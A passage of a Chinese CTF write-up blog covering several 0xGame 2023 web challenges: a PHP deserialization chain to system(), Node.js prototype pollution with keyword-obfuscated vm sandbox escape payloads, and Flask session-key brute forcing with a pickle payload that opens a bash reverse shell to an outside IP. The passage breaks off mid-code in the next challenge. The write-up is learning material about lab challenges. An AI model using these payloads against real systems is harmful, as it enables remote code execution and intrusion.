class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-variable">$cache1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br><span class="hljs-variable">$cache2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br><span class="hljs-variable">$poc</span>-&gt;storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br><span class="hljs-variable">$poc</span>-&gt;storage-&gt;store = &amp;<span class="hljs-variable">$cache2</span>-&gt;expired;<br><span class="hljs-variable">$cache2</span>-&gt;key = <span class="hljs-string">&#x27;php -r &quot;phpinfo();&quot;&#x27;</span>;<br><span class="hljs-variable">$poc</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$cache1</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$cache2</span>);<br><span class="hljs-variable">$cache2</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br><span class="hljs-variable">$cache2</span>-&gt;helper-&gt;funcs = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>这里在总结一波思路，首先new两个Cache对象，接着new一个DataObject对象，用于后续调用Storage.__set()方法，接着给其中的storage赋值为Storage对象，随后在将storage中的store属性与cache2的expired属性做一个引用。然后是将data属性赋值为含有两个元素的数组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里呢先看data的第一个元素也就是cache1，其在foreach循环的第一次赋值时，调用了set魔术方法，这时候其中的store属性被赋值为空数组，接着由于cache1的expired属性为false，这时候是无法成功调用clean方法的，于是store数组此时被赋值为array(&#x27;key1&#x27;=&gt;$cache1)，总之此时store便不在是空了。但此时我们注意由于引用的存在，此时cache2的expired属性已经不可能为false了，紧接着在第二次foreach循环时，便可以成功调用cache2的clean方法<br></code></pre></td></tr></table></figure>
<p>接着我们将helper赋值为Helper对象，由于其中不存在clean方法，于是我们成功调用了其中的call魔术方法，并且字符串clean与key被当做call的参数，此时我们又可以将其中的funcs赋值为一个数组：<code>array('clean'=&gt;'system')</code>。其中的key为我们想要执行的恶意代码即可，这样在上述的组合下<code>$this-&gt;funcs[$name](...$args);</code>变为<code>$this-&gt;funcs['clean'](恶意代码);=&gt;system(恶意代码);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;DataObject&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;storage&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Storage&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;store&quot;</span>;N;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;key1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Cache&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;value&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;expired&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>;N;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;key2&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Cache&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;php -r &quot;</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;value&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;expired&quot;</span>;R:<span class="hljs-number">3</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Helper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;funcs&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;clean&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;&#125;&#125;&#125;&#125; <br></code></pre></td></tr></table></figure>
<p>输出如上，这里也是看别人wp知道flag被放在了环境变量中，这里它采用读取phpinfo的方法。但令我疑惑的是为何直接赋值为phpinfo()的话执行不了。。。</p>
<p>![image-20231023191959782](0xGame 2023/image-20231023191959782.png)</p>
<p>拿到flag</p>
<h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="Week-2-ez-sandbox"></a>[Week 2] ez_sandbox</h2>
<p>打开题目发现一个登录框，弱口令无果，扔给dirsearch扫目录，随后用bp抓一个登录包数据看看有何信息：</p>
<p>![image-20231026195758333](0xGame 2023/image-20231026195758333.png)</p>
<p>如上图是一个json数据块，其中包含用户名和密码，其次扫目录发现存在注册用户页面，看题目名称为沙箱，也没思路，于是看wp发现考察nodejs沙箱逃逸和原型链污染（懵逼了，这玩意儿没咋好好学，┭┮﹏┭┮）只能浑水摸鱼了，写完wp后就学！！！</p>
<p>代码在注册和登录的时候使⽤了 clone(req.body)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>        <span class="hljs-title function_">merge</span>(target[key], source[key])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        target[key] = source[key]<br>    	&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br></code></pre></td></tr></table></figure>
<p>根据⼀些参考⽂章, 很容易就可以知道这⾥存在原型链污染, 但是 <strong>proto</strong> 关键词被过滤了<br>
如果你对原型链这个概念稍微做⼀点深⼊了解, 就可以知道, 对于⼀个实例对象, 它的 <strong>proto</strong> 就等于<code>constructor.prototype</code>这样可以绕过proto关键词的过滤</p>
<p>先注册⼀个 test用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 username in admins 表达式的结果为True</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        	<span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123&quot;</span><br>		<span class="hljs-punctuation">&#125;</span><br>	<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>![image-20231026201904531](0xGame 2023/image-20231026201904531.png)</p>
<p>随后test 123登录进去发现成功得到admin用户权限</p>
<p>![image-20231026201951999](0xGame 2023/image-20231026201951999.png)</p>
<p>然后是⼀个简单的 vm 沙箱逃逸</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p>代码会 catch vm 沙箱执⾏时抛出的异常, 并访问异常的 message 属性</p>
<p>那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 arguments.callee.caller (指向</p>
<p>当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE</p>
<p>waf 函数有⼀些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中</p>
<p>括号 + 字符串拼接的形式绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<p>下面两种方式都行</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// method 1</span><br>throw new Proxy(<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截</span><br>    get<span class="hljs-punctuation">:</span> function()<span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数</span><br>        const c = arguments.callee.caller<br>        const p = (c<span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span>(&#x27;return pro&#x27;+&#x27;cess&#x27;))()<br>        return p<span class="hljs-punctuation">[</span>&#x27;mainM&#x27;+&#x27;odule&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;requi&#x27;+&#x27;re&#x27;<span class="hljs-punctuation">]</span>(&#x27;child_pr&#x27;+&#x27;ocess&#x27;)<span class="hljs-punctuation">[</span>&#x27;ex&#x27;+&#x27;ecSync&#x27;<span class="hljs-punctuation">]</span>(&#x27;cat /flag&#x27;).toString();<br>	<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span>)<br><br><span class="hljs-comment">// method 2</span><br>let obj = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-comment">// 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数</span><br>obj.__defineGetter__(&#x27;message&#x27;<span class="hljs-punctuation">,</span> function()<span class="hljs-punctuation">&#123;</span><br>    const c = arguments.callee.caller<br>    const p = (c<span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;constru&#x27;+&#x27;ctor&#x27;<span class="hljs-punctuation">]</span>(&#x27;return pro&#x27;+&#x27;cess&#x27;))()<br>    return p<span class="hljs-punctuation">[</span>&#x27;mainM&#x27;+&#x27;odule&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;requi&#x27;+&#x27;re&#x27;<span class="hljs-punctuation">]</span>(&#x27;child_pr&#x27;+&#x27;ocess&#x27;)<span class="hljs-punctuation">[</span>&#x27;ex&#x27;+&#x27;ecSync&#x27;<span class="hljs-punctuation">]</span>(&#x27;cat /flag&#x27;).toString();<br><span class="hljs-punctuation">&#125;</span>)<br>throw obj<br></code></pre></td></tr></table></figure>
<p>![image-20231026202002001](0xGame 2023/image-20231026202002001.png)</p>
<p>拿到flag（等我深入学习一波再回来思考</p>
<h2 id="Week-3-notebook"><a href="#Week-3-notebook" class="headerlink" title="Week-3-notebook"></a>[Week 3] notebook</h2>
<p>![image-20231026203700101](0xGame 2023/image-20231026203700101.png)</p>
<p>打开题目是一个笔记本 ？？？,这里测试了一番发现不是xss等漏洞，搜目录也没有信息，根据题目提示说是该项目由flask框架搭建。之后看了wp发现考察的是session伪构造，pickle反序列化，反弹shell</p>
<p>题目源码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, content</span>):<br>        self._name = name<br>        self._content = content<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">content</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_note</span>(<span class="hljs-params">note_id</span>):<br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    note_raw = notes.get(note_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    note = pickle.loads(note_raw)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.name, note_content=note.content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>():<br>    note_name = request.form.get(<span class="hljs-string">&#x27;note_name&#x27;</span>)<br>    note_content = request.form.get(<span class="hljs-string">&#x27;note_content&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)<br>    <br>    note_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    note = Note(note_name, note_content)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;notes&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;<br>    <br>    notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]<br>    notes[note_id] = pickle.dumps(note)<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_success&#x27;</span>, note_id=note_id)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>():<br>    note_id = request.form.get(<span class="hljs-string">&#x27;note_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.get(note_id):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    <span class="hljs-keyword">del</span> notes[note_id]<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_success&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
<p>这里由于没学过相关知识，我还是跟着wp走一遍吧，后续再去补</p>
<p>这里分析一遍代码会发现，存在secret key，这里就是让我们利用其去session伪造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">⾸先得知道 flask 的 session 信息存储在 cookie 中, 因此这种 session 也被称作 &quot;客户端 session&quot;<br>⽽ session 要想保证不被恶意修改, 就会使⽤⼀个 secret key 进⾏签名<br>注意 &quot;签名&quot; 不等于 &quot;加密&quot;, 我们其实仍然能够看到 session 中存储的信息, 但是⽆法修改它, 这⼀点和 JWT (JSON Web Token) 类似<br></code></pre></td></tr></table></figure>
<p>题目中的 secret key，这⾥留了个随机数主要是让⼤家关注随机数的长度, 如果这个长度过小, 那么很容易就能爆破出来，⼀部分人可能不知道它长度是多少, 这个其实放到 python 里面运行⼀下就知道了, 只有 4 位，然后因为是 hex, 所以只会出现 0123456789abcdef 这些字符</p>
<p>![image-20231104101618909](0xGame 2023/image-20231104101618909.png)</p>
<p>如图所示，可以看到位数是4位，接下来先手动生成⼀个四位数字典</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> itertools<br>d = itertools.product(<span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, repeat=<span class="hljs-number">4</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dicts.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>        s = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        f.write(s + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>利用session伪造工具：<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
<p>将上述脚本生成的txt复制到工具的目录下，随后输入如下命令</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">flask-unsign --unsign --cookie &quot;.eJwti1sLgjAYQP9K7H0w5qZ8gg82MqULmJeZb9vwks0KCnwQ_3sJHThv58zo8fw0b-TPyGPMczlhmCkDmDXKYFDgYAKUM8dVwFy1dhuNfNSFWZmm4R9xEhG0WkYvbaG1ybTLRyB1neVWjFsb0-KQTFFFea-lLIaw7A299IZn6zdoykktOfl9-2t1vq_auLwduyBAy7J8ARAdMR4.ZUW4BQ.76TUC_1vDgzmCy2DVpM6xWsZQyc&quot; --wordlist dicts.txt --no-literal-eval<br></code></pre></td></tr></table></figure>
<p>这里的cookie的获取是如下图所示的页面下的cookie</p>
<p>![image-20231104112534159](0xGame 2023/image-20231104112534159.png)</p>
<p>![image-20231104105505385](0xGame 2023/image-20231104105505385.png)</p>
<p>如图成功爆破，然后就是利用路由<code>/&lt;path:note_id&gt;</code>下的pickle反序列化，这里用的是反弹shell，payload如下（）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;&#x27;&#x27;cos<br>system<br>(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;<br>tR.<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>
<p>然后就是session伪造，注意note_id值要为对应值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">flask-unsign --sign --cookie &quot;&#123;&#x27;notes&#x27;: &#123;&#x27;74476504-4ac9-4eac-9a93-0925436a946a&#x27;: b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\&#x27;&#x27;\ntR.&#x27;&#x27;&#x27;&#125;&#125;&quot; --secret 143b --no-literal-eval<br></code></pre></td></tr></table></figure>
<p>这里由于cookie周围被双引号包围，故我们里面的shell只能都用单引号，起冲突的我们要用\转义</p>
<p>![image-20231104110414689](0xGame 2023/image-20231104110414689.png)</p>
<p>如图成功加密，我们刷新页面bp抓包，替换上述cookie发送即可，同时我们的vps要开启监听（注意端口要在安全组放开）</p>
<p>![image-20231104112644645](0xGame 2023/image-20231104112644645.png)</p>
<p>![image-20231104112416629](0xGame 2023/image-20231104112416629.png)</p>
<p>![image-20231104112349809](0xGame 2023/image-20231104112349809.png)</p>
<p>成功反弹shell拿到flag</p>
<h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="Week-3-rss-parser"></a>[Week 3] rss_parser</h2>
<p>这道题看不懂，先跟着wp复现完，最后学相关知识吧</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        feed_url = request.form[<span class="hljs-string">&#x27;url&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span 